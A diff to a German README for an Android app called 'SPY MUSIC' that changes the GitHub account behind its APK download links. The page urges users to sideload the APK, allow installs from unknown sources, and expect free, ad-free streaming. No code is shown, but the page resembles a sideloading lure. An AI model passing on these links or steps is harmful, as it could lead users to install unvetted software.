@@ -9,20 +9,20 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/spicy-mother-fugger-2001/SPY-MUSIC/releases/latest">
+  <a href="https://github.com/spicy-os123-python-main/SPY-MUSIC/releases/latest">
     <img src="https://img.shields.io/badge/📲%20DIREKTER%20DOWNLOAD-SPY--MUSIC%20(APK)-FF0055?style=for-the-badge&logo=android&logoColor=white" height="48" alt="Download SPY MUSIC APK" />
   </a>
 </p>
 
 <p align="center">
-  👉 <b><a href="https://github.com/spicy-mother-fugger-2001/SPY-MUSIC/releases/latest">Hier klicken: Neueste APK direkt auf das Handy herunterladen</a></b> 👈
+  👉 <b><a href="https://github.com/spicy-os123-python-main/SPY-MUSIC/releases/latest">Hier klicken: Neueste APK direkt auf das Handy herunterladen</a></b> 👈
 </p>
 
 ---
 
 ## 📲 So installierst du SPY MUSIC auf deinem Handy
 
-1. **Herunterladen:** Klicke oben auf den roten **DOWNLOAD APK**-Button oder öffne [Releases](https://github.com/spicy-mother-fugger-2001/SPY-MUSIC/releases/latest).
+1. **Herunterladen:** Klicke oben auf den roten **DOWNLOAD APK**-Button oder öffne [Releases](https://github.com/spicy-os123-python-main/SPY-MUSIC/releases/latest).
 2. **Datei öffnen:** Öffne die heruntergeladene Datei (z. B. in deiner Benachrichtigungsleiste oder im Ordner *Downloads*).
 3. **Installation bestätigen:** Falls Android fragt, erlaube *"Apps aus dieser Quelle installieren"* und tippe auf **Installieren**.
 4. **Fertig!** Öffne SPY MUSIC und streame alle deine Songs, Alben und Playlists 100% werbefrei.
